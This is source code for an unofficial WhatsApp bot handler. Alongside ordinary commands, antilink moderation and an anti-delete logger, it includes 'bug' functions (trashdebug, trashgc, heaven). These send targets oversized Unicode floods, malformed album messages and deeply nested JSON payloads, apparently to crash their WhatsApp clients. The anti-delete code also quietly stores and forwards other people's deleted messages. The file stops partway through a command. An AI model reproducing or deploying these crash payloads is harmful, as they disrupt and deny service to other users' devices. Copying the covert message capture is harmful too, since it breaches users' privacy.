require("./dave")
const { downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia, generateWAMessageFromContent, GroupSettingChange, jidDecode, WAGroupMetadata, emitGroupParticipantsUpdate, emitGroupUpdate, generateMessageID, jidNormalizedUser, generateForwardMessageContent, WAGroupInviteMessageGroupMetadata, GroupMetadata, Headers, delay, WA_DEFAULT_EPHEMERAL, WADefault, getAggregateVotesInPollMessage, generateWAMessageContent, areJidsSameUser, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaconnet, makeInMemoryStore, MediaType, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WAMediaUpload, mentionedJid, processTime, Browser, MessageType,
Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WAconnet, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header } = require("@whiskeysockets/baileys")
///package depedencies///////////////
const os = require('os')
const fs = require('fs')
const fg = require('api-dylux')
const fetch = require('node-fetch');
const axios = require('axios')
const { exec, execSync } = require("child_process")
const chalk = require('chalk')
const cheerio = require('cheerio');
const crypto = require('crypto');
const nou = require('node-os-utils')
const moment = require('moment-timezone');
const path = require ('path');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const speed = require('performance-now')
const { Sticker } = require('wa-sticker-formatter');
const { igdl } = require("btch-downloader");
const yts = require ('yt-search');
const { appname,antidel, herokuapi} = require("./set.js");
global.db.data = JSON.parse(fs.readFileSync('./library/database/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}
///////////database access/////////////////
const { addPremiumUser, delPremiumUser } = require("./library/lib/premiun");
/////////exports////////////////////////////////
module.exports = async (trashcore, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
var msgR = m.message.extendedTextMessage?.contextInfo?.quotedMessage;  
//////////Libraryfunction///////////////////////
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./library/lib/function')
// Main Setting (Admin And Prefix )///////
const budy = (typeof m.text === 'string') ? m.text : '';
        const prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.xprefix
const isCmd = body.startsWith(global.xprefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (trashcore.user.id.split(':')[0]+'@s.whatsapp.net' || trashcore.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = trashcore.user.id.split(':')[0];
const senderNumber = sender.split('@')[0]
const trashown = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
    const premuser = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const isNumber = x => typeof x === 'number' && !isNaN(x)
const formatJid = num => num.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
const isPremium = trashown || premuser.map(u => formatJid(u.id)).includes(m.sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await trashcore.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
/////////////Setting Console//////////////////
console.log(chalk.black(chalk.bgWhite(!command ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
/////////quoted functions//////////////////
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `𝙳𝙰𝚅𝙴-𝙼𝙳 verified`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}
let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                   if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                           if (!('welcome' in chats)) chats.welcome = false
        if (!('goodbye' in chats)) chats.goodbye = false
        if (!('warn' in chats)) chats.warn = {}
               } else global.db.data.chats[from] = {
                  antilinkgc: false,
                  antilinkgc: false,
                  welcome: false,
                  goodbye: false,
                  warn: {} 
               }
    if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (trashown) return m.reply(bvl)
               await trashcore.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			trashcore.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (trashown) return m.reply(bvl)
               await trashcore.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			trashcore.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].warn && db.data.chats[m.chat].warn[m.sender]) {
      const warnings = db.data.chats[m.chat].warn[m.sender]

      if (warnings >= setting.warnCount) {
        if (!isBotAdmins || isAdmins || trashown) return

        await trashcore.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.sender
          }
        })
      }
    }

const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('online' in setting)) setting.online = true
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlypc' in setting)) setting.onlygrub = false   
	  } else db.data.settings[botNumber] = {
   	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: true,
   		auto_ai_grup: false,
   		goodbye: false,
    		onlygrub: false,
            onlypc: false,
            online: false,
       welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }



if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await trashcore.readMessages([readkey]);
}
trashcore.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
trashcore.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
trashcore.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await trashcore.updateProfileStatus(`✳️ 𝚅𝙴𝙽𝙾𝙼-𝚇𝙼𝙳 || 🕳️ Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}
    
    if (!m.isGroup && !trashown && db.data.settings[botNumber].onlygrub ) {
        	if (command){
            return m.reply(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${global.owner}`)
            }
        }
        // Private Only
        if (!trashown && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (command){
	         return m.reply("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
    
    ///unavailable and online 
    if (!trashcore.public) {
            if (trashown && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (command) {
        
trashcore.sendPresenceUpdate('unavailable', from)
        }
        }
    
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}
const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://files.catbox.moe/tq6zy6.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      Runtime : "${runtime(process.uptime())}",
      message: `Sender : @${m.sender.split('@')[0]}\n愛とは何か？ `,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

      

    
const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `Made by 𝙳𝙰𝚅𝙴-𝙼𝙳 devs`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const qtext = { key: {fromMe: false, participant: `6281519434797@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝚅𝙴𝙽𝙾𝙼-𝚇𝙼𝙳 is on fire!🔥" }}}

////////////////Reply Message////////////////
const replypic = fs.readFileSync('./library/media/connect.jpg');
const quotedMessage = m.quoted?.message?.extendedTextMessage?.contextInfo?.quotedMessage || m.quoted?.message?.imageMessage || m.quoted?.message?.videoMessage;
async function trashreply(teks) {
trashcore.sendMessage(m.chat, {
text: teks,
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletter",
newsletterName: "𝙳𝙰𝚅𝙴-𝙼𝙳" 
}
}
}, {
quoted: qtext
})
}

async function reply(text) {
            trashcore.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title:"𝚅𝙴𝙽𝙾𝙼-𝚇𝙼𝙳",
                        body:"made by Dave",
                        thumbnailUrl: "https://i.imgur.com/MECtKXp.jpeg",
                        sourceUrl: null,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted:m})
        }
const trashpic = fs.readFileSync('./library/media/porno.jpg');
async function replymenu(teks) {
trashcore.sendMessage(m.chat, {
image:trashpic,  
caption: teks,
sourceUrl: 'https://github.com/giftdee',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletter",
newsletterName: "𝙳𝙰𝚅𝙴-𝙼𝙳"
}
}
}, {
quoted: fkontak
})
}
 //////////React message///////////////
    const reaction = async (jidss, emoji) => {
    trashcore.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
 /////////function set presence/////
                  /* if (global.autoRecording) {
        trashcore.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        trashcore.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let trashrecord = ['recording','composing']
        let xeonrecordinfinal = trashrecord[Math.floor(Math.random() * trashrecord.length)]
        trashcore.sendPresenceUpdate(xeonrecordinfinal, from)

        }*/
if (m.isGroup) {
    if (body.includes(`@254104260236`)) {
        reaction(m.chat, "❓")
    }
 }
    async function loading () {
var menuload = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
" Trashcore system..."
]
let { key } = await trashcore.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < menuload.length; i++) {
await reply( menuload[i],{edit:key })
}
}
    
///////////////Similarity///////////////////////
function getCaseNames() {
  try {
    const data = fs.readFileSync('./bothandler.js', 'utf8');
    const casePattern = /case\s+'([^']+)'/g;
    const matches = data.match(casePattern);

    if (matches) {
      return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
    } else {
      return [];
    }
  } catch (error) {
    console.error('error occurred:', error);
    throw error;
  }
}

/////////////fetch commands///////////////
let totalfeature= () =>{
var mytext = fs.readFileSync("./bothandler.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }
////////////tag owner reaction//////////////
if (m.isGroup) {
    if (body.includes(`@${owner}`)) {
        reaction(m.chat, "❌")
    }
 }
/////////////test bot no prefix///////////////
if ((budy.match) && ["bot",].includes(budy) && !isCmd) {
reply(`bot is always online ✅`)
}	
///////////example///////////////////////////
////////bug func/////////////////////
 async function trashdebug(target) {
  await trashcore.sendMessage(target, {
    text:
      "🧪‌⃰Ꮡ‌‌" +
      "ꦾ࣯࣯" +
      "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" +
      "𑇂𑆵𑆴𑆿".repeat(60000),
    contextInfo: {
      externalAdReply: {
        title: ``,
        body: ``,
        previewType: "PHOTO",
        thumbnail: null,
        sourceUrl: ``
      }
    }
  }, { quoted: m });
}
                    
                            
                        
                    

    
            
        
      

///////bug group/////////////////  
    async function trashgc(target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await trashcore.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{participant:{jid:target}})
}
let xx = {"url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c&mms3=true","mimetype": "image/jpeg","fileSha256": "yTsEb/zyGK+lB2DApj/PK+gFA1D6Heq/G0DIQ74uh6k=","fileLength": "52039","height": 786,"width": 891,"mediaKey": "XtKW4xJTHhBzWsRkuwvqwQp/7SVayGn6sF6XgNblyLo=","fileEncSha256": "rm/kKkIFGA1Vh6yKeaetbsvCS7Cp2vcGYoiNkrvPCwY=","directPath": "/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c"}
let xz
for (let s = 0; s < 2; s++) {
if (s === 1) {
xx.caption = "𑲱".repeat(200000);
}
const xy = await generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{participant:{jid:target}})
xz = await trashcore.relayMessage(target, xy.message, {messageId:xy.key.id})
await sleep(100)
}
}
        
  async function heaven(target) {
let msg = await generateWAMessageFromContent(target, {
  interactiveMessage: {
    contextInfo: {
      isForwarded: true, 
      forwardingScore: 1972,
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    }, 
    header: {
      jpegThumbnail: null, 
      hasMediaAttachment: true, 
      title: "D | 7eppeli-Exploration"
    }, 
    nativeFlowMessage: {
      buttons: [
        {
          name: "payment_method",
          buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
        }
      ],
      messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
    }, 
  }
}, { userJid:target });
  
  await trashcore.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}        
              
          
    
    
 
    
              
              
        
   
    ////anti delete//////
const baseDir = 'message_data';
if (!fs.existsSync(baseDir)) {
  fs.mkdirSync(baseDir);
}

function loadChatData(remoteJid, messageId) {
  const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
  try {
    const data = fs.readFileSync(chatFilePath, 'utf8');
    return JSON.parse(data) || [];
  } catch (error) {
    return [];
  }
}

function saveChatData(remoteJid, messageId, chatData) {
  const chatDir = path.join(baseDir, remoteJid);

  if (!fs.existsSync(chatDir)) {
    fs.mkdirSync(chatDir, { recursive: true });
  }

  const chatFilePath = path.join(chatDir, `${messageId}.json`);

  try {
    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
  } catch (error) {
    console.error('Error saving chat data:', error);
  }
}

function handleIncomingMessage(message) {
  const remoteJid = message.key.remoteJid;
  const messageId = message.key.id;

  const chatData = loadChatData(remoteJid, messageId);
  chatData.push(message);
  saveChatData(remoteJid, messageId, chatData);
}

async function handleMessageRevocation(trashcore, revocationMessage) {
  const remoteJid = revocationMessage.key.remoteJid;
  const messageId = revocationMessage.message.protocolMessage.key.id;

  const chatData = loadChatData(remoteJid, messageId);
  const originalMessage = chatData[0];

  if (originalMessage) {
    const deletedBy = revocationMessage.participant || revocationMessage.key.participant || revocationMessage.key.remoteJid;
    const sentBy = originalMessage.key.participant || originalMessage.key.remoteJid;

    const deletedByFormatted = `@${deletedBy.split('@')[0]}`;
    const sentByFormatted = `@${sentBy.split('@')[0]}`;

    if (deletedBy.includes(trashcore.user.id) || sentBy.includes(trashcore.user.id)) return;

    let notificationText = `𝚅𝙴𝙽𝙾𝙼-𝚇𝙼𝙳-ANTIDELETE🕳️\n\n` +
      ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆 : ${deletedByFormatted}\n\n`;

    try {
      if (originalMessage.message?.conversation) {
        // Text message
        const messageText = originalMessage.message.conversation;
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : ${messageText}`;
        await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
      } 
      else if (originalMessage.message?.extendedTextMessage) {
        // Extended text message (quoted messages)
        const messageText = originalMessage.message.extendedTextMessage.text;
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁 : ${messageText}`;
        await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
      }
      else if (originalMessage.message?.imageMessage) {
        // Image message
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Image]`;
        try {
          const buffer = await trashcore.downloadMediaMessage(originalMessage.message.imageMessage);
          await trashcore.sendMessage(trashcore.user.id, { 
            image: buffer,
	    caption: `${notificationText}\n\nImage caption: ${originalMessage.message.imageMessage.caption}`
          });
        } catch (mediaError) {
          console.error('Failed to download image:', mediaError);
          notificationText += `\n\n⚠️ Could not recover deleted image (media expired)`;
          await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.videoMessage) {
        // Video message
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Video]`;
        try {
          const buffer = await trashcore.downloadMediaMessage(originalMessage.message.videoMessage);
          await trashcore.sendMessage(trashcore.user.id, { 
            video: buffer, 
            caption: `${notificationText}\n\nVideo caption: ${originalMessage.message.videoMessage.caption}`
          });
        } catch (mediaError) {
          console.error('Failed to download video:', mediaError);
          notificationText += `\n\n⚠️ Could not recover deleted video (media expired)`;
          await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
        }
      } else if (originalMessage.message?.stickerMessage) {
	 notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Sticker]`;
      // Sticker message
      const buffer = await trashcore.downloadMediaMessage(originalMessage.message.stickerMessage);      
      await trashcore.sendMessage(trashcore.user.id, { sticker: buffer, 
contextInfo: {
          externalAdReply: {
          title: notificationText,
          body: `DELETED BY : ${deletedByFormatted}`,
          thumbnail: trashpic,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: false
          }}});
      } else if (originalMessage.message?.documentMessage) {
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Document]`;
        // Document message
        const docMessage = originalMessage.message.documentMessage;
        const fileName = docMessage.fileName || `document_${Date.now()}.dat`;
        console.log('Attempting to download document...');
        const buffer = await trashcore.downloadMediaMessage(docMessage);
        
       if (!buffer) {
            console.log('Download failed - empty buffer');
            notificationText += ' (Download Failed)';
            return;
        }
        
        console.log('Sending document back...');
        await trashcore.sendMessage(trashcore.user.id, { 
            document: buffer, 
            fileName: fileName,
            mimetype: docMessage.mimetype || 'application/octet-stream',
contextInfo: {
          externalAdReply: {
          title: notificationText,
          body: `DELETED BY: \n\n ${deletedByFormatted}`,
          thumbnail: trashpic,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: true
          }}});
      } else if (originalMessage.message?.audioMessage) {
	      notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮: \n\n [Audio]`;
      // Audio message
      const buffer = await trashcore.downloadMediaMessage(originalMessage.message.audioMessage);
      const isPTT = originalMessage.message.audioMessage.ptt === true;
      await trashcore.sendMessage(trashcore.user.id, { audio: buffer, ptt: isPTT, mimetype: 'audio/mpeg', 
contextInfo: {
          externalAdReply: {
          title: notificationText,
          body: `DELETED BY: \n\n ${deletedByFormatted}`,
          thumbnail: trashpic,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: true
          }}});
      }	      
    } catch (error) {
      console.error('Error handling deleted message:', error);
      notificationText += `\n\n⚠️ Error recovering deleted content 😓`;
      await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
    }
  }
}




        


 if (antidel === "TRUE") {
        if (m.message?.protocolMessage?.key) {
          await handleMessageRevocation(trashcore, m);
        } else {
          handleIncomingMessage(m);
        }
	  }                   
                        
                
                    

            
                
    


        
                        
                

            

            

    
///////////end bug func///////////
const example = (teks) => {
return `\n *invalid format!*\n`
}
const menu = require('./library/listmenu/menulist');
/////////////plugins commands/////////////
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}
//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "davecommands"))
const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,mime,sleep,fkontak,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage,heaven,menu,loading,quotedMessage}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, trashdex)
}
}
if (!pluginsDisable) return
switch (command) {
case 'script':
case 'repo': {
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name    : ${botname}
│ • Owner   : ${ownername}
│ • Version  : ${botversion}
│ • Repo : gitHub.com/giftdee/VENOM-XMD/fork 
│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
`
  reply(botInfo)
}
break
//==================================================//     
        case "update": case "redeploy": {
		      const axios = require('axios');

		if(!trashown) return reply(mess.owner);
		     if (!appname || !herokuapi) {
            await reply("It looks like the Heroku app name or API key is not set. Please make sure you have set the `APP_NAME` and `HEROKU_API` environment variables.");
            return;
        }

        async function redeployApp() {
            try {
                const response = await axios.post(
                    `https://api.heroku.com/apps/${appname}/builds`,
                    {
                        source_blob: {
                            url: "https://github.com/giftdee/DAVE-XD/tarball/main",
                        },
                    },
                    {
                        headers: {
                            Authorization: `Bearer ${herokuapi}`,
                            Accept: "application/vnd.heroku+json; version=3",
                        },
                    }
                );

                await m.reply("Your bot is undergoing an upgrade, hold  for the next 2 minutes as the redeploy executes! Once done, you’ll have the freshest version of *Black-Demon* .");
                console.log("Build details:", response.data);
            } catch (error) {
                const errorMessage = error.response?.data || error.message;
                await reply(`Failed to update and redeploy. Please check if you have set the Heroku API key and Heroku app name correctly.`);
                console.error("Error triggering redeploy:", errorMessage);
            }
        }

